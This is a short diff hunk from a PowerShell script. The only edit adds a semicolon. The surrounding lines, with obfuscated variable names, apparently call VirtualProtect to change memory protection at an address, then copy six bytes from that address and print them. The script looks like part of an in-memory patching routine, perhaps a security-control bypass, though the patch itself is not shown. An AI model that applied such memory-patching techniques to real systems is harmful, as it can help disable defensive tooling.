@@ -44,4 +44,4 @@ $vp.Invoke($LGaudzvo99, 3, 0x20, [ref]$HjmYfFIP99);
 
 $arr = New-Object Byte[] 10;
 [System.Runtime.InteropServices.Marshal]::Copy($LGaudzvo99, $arr, 0, 6);
-$arr -join ","
+$arr -join ",";
